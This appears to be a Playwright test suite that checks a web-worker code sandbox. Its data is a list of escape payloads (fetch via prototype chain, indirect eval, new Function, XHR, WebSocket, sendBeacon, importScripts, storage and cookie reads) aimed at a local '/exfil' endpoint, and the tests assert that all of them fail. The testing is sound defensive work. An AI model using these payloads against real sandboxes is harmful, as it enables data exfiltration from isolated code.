// Every escape attempt is one test, named after the attempt. Each must end
// as an error or a limit, and none may produce a request that reaches /exfil
// (checked against the server's log and the page's finished requests; a
// CSP-blocked attempt may still show up as a failed request, which is the
// policy doing its job).
import { expect, test, type Page } from '@playwright/test';
import { create, openHost, run, serverRequests, type Stripped } from './helpers';

const EXFIL = 'http://127.0.0.1:4173/exfil';

const attempts: { name: string; code: string; expect?: (r: Stripped) => void }[] = [
  { name: 'fetch', code: `await fetch("${EXFIL}?fetch")` },
  { name: 'self.fetch', code: `await self.fetch("${EXFIL}?self")` },
  { name: 'fetch through the prototype chain', code: `let o = self, f; while (o) { f = Object.getOwnPropertyDescriptor(o, "fetch"); if (f) break; o = Object.getPrototypeOf(o) } if (!f) throw new ReferenceError("gone"); await f.value("${EXFIL}?proto")` },
  { name: 'new Function("return fetch")', code: `await new Function("return fetch")()("${EXFIL}?fn")` },
  { name: 'indirect eval', code: `await (0, eval)("fetch")("${EXFIL}?eval")` },
  { name: 'XMLHttpRequest', code: `const x = new XMLHttpRequest(); x.open("GET", "${EXFIL}?xhr", false); x.send()` },
  { name: 'WebSocket', code: `new WebSocket("ws://127.0.0.1:4173/exfil?ws")` },
  { name: 'EventSource', code: `new EventSource("${EXFIL}?sse")` },
  { name: 'navigator.sendBeacon', code: `navigator.sendBeacon("${EXFIL}?beacon", "x")` },
  { name: 'importScripts', code: `importScripts("${EXFIL}?import")` },
  { name: 'dynamic import', code: `await import("${EXFIL}?dynimport")` },
  { name: 'nested Worker', code: `new Worker("${EXFIL}?worker")` },
  { name: 'SharedWorker', code: `new SharedWorker("${EXFIL}?shared")` },
  { name: 'WebTransport', code: `new WebTransport("https://127.0.0.1:4173/exfil?wt")` },
  { name: 'location assignment', code: `location.href = "${EXFIL}?loc"` },
  // `location` is removed from the scope, so the assignment just creates a plain property: no navigation, nothing leaves.
  { name: 'self.location assignment', code: `self.location = "${EXFIL}?loc2"; return typeof self.location`, expect: (r) => expect(r.status).toBe('ok') },
  { name: 'document', code: `return document.cookie`, expect: (r) => expect(r.status).toBe('error') },
  { name: 'window', code: `return window.name`, expect: (r) => expect(r.status).toBe('error') },
  { name: 'parent', code: `parent.postMessage("x", "*")`, expect: (r) => expect(r.status).toBe('error') },
  { name: 'localStorage', code: `return localStorage.getItem("x")`, expect: (r) => expect(r.status).toBe('error') },
  { name: 'indexedDB', code: `indexedDB.open("x")`, expect: (r) => expect(r.status).toBe('error') },
  { name: 'caches', code: `await caches.open("x")`, expect: (r) => expect(r.status).toBe('error') },
  { name: 'BroadcastChannel', code: `new BroadcastChannel("x").postMessage("y")`, expect: (r) => expect(r.status).toBe('error') },
  { name: 'self.postMessage to the frame', code: `self.postMessage({ t: "spawn" }); return 1`, expect: (r) => expect(r.status).toBe('error') },
  { name: 'self.close', code: `self.close(); return 1`, expect: (r) => expect(['error', 'limit']).toContain(r.status) },
  { name: 'Request/Response', code: `new Request("${EXFIL}?req")`, expect: (r) => expect(r.status).toBe('error') },
];

async function expectNoExfil(page: Page, seen: string[]) {
  const log = await serverRequests(page);
  expect(log.filter((p) => p.startsWith('/exfil'))).toEqual([]);
  expect(seen.filter((u) => u.includes('/exfil'))).toEqual([]);
}

test.describe('escape attempts (url mode, strict host)', () => {
  const seen: string[] = [];
  const blocked: string[] = [];
  test.beforeEach(async ({ page }) => {
    seen.length = 0;
    blocked.length = 0;
    page.on('requestfinished', (r) => seen.push(r.url()));
    page.on('requestfailed', (r) => blocked.push(`${r.url()} ${r.failure()?.errorText ?? ''}`));
    await openHost(page, 'strict');
    await page.evaluate(() => fetch('/__reset'));
    expect((await create(page, 's', '/sandbox', { caps: { busyMs: 1500, timeoutMs: 5000 } })).state).toBe('ready');
  });

  for (const a of attempts) {
    test(a.name, async ({ page }) => {
      const r = await run(page, 's', a.code);
      if (a.expect) a.expect(r);
      else expect(['error', 'limit']).toContain(r.status);
      await expectNoExfil(page, seen);
    });
  }

  test('the worker scope has no window, document or network globals', async ({ page }) => {
    const r = await run(page, 's', `return ["window","document","fetch","XMLHttpRequest","WebSocket","EventSource","importScripts","Worker","navigator","caches","indexedDB","location","postMessage"].map(n => typeof globalThis[n])`);
    expect(r.status).toBe('ok');
    expect(r.value).toEqual(new Array(13).fill('undefined'));
  });

  test('the port is not reachable from the code', async ({ page }) => {
    const r = await run(page, 's', `const names = Object.getOwnPropertyNames(self).filter(n => { try { return self[n] instanceof MessagePort } catch { return false } }); return [typeof port, names, typeof self.onmessage]`);
    expect(r.status).toBe('ok');
    expect(r.value).toEqual(['undefined', [], 'undefined']);
  });

  test('a message from the code to the frame is ignored (no spawn, no kill)', async ({ page }) => {
    const r = await run(page, 's', `try { self.postMessage({ t: "kill", id: "x" }) } catch {} ; return await sdk.echo("alive")`);
    expect(r.value).toBe('alive');
  });

  test('the function tree exposes only names, no sources', async ({ page }) => {
    const r = await run(page, 's', `return [Object.keys(sdk).sort(), String(sdk.echo).length < 80, typeof sdk.constructor, sdk.__proto__]`);
    expect(r.status).toBe('ok');
    const [keys, short, ctor, proto] = r.value as [string[], boolean, string, unknown];
    expect(keys).toEqual(['big', 'blob', 'count', 'del', 'echo', 'fail', 'help', 'math', 'slow', 'unclonable']);
    expect(short).toBe(true);
    expect(ctor).toBe('undefined');
    expect(proto).toBeNull();
  });

  test('a return value that cannot be cloned is a CloneError, nothing crosses', async ({ page }) => {
    const r = await run(page, 's', `return { f: () => 1 }`);
    expect(r.status).toBe('error');
    expect(r.error?.name).toBe('CloneError');
    const c = await run(page, 's', `try { await sdk.unclonable(); return "crossed" } catch (e) { return e.name }`);
    expect(c.value).toBe('CloneError');
  });

  test('a call to a name outside the map does nothing on the host', async ({ page }) => {
    const r = await run(page, 's', `try { await sdk.nope(1) } catch (e) { return e.name }`);
    expect(r.value).toBe('TypeError');
  });

  test('Atomics.wait is not available (no cross-origin isolation in the frame)', async ({ page }) => {
    const r = await run(page, 's', `return typeof SharedArrayBuffer`);
    expect(r.value).toBe('undefined');
  });
});
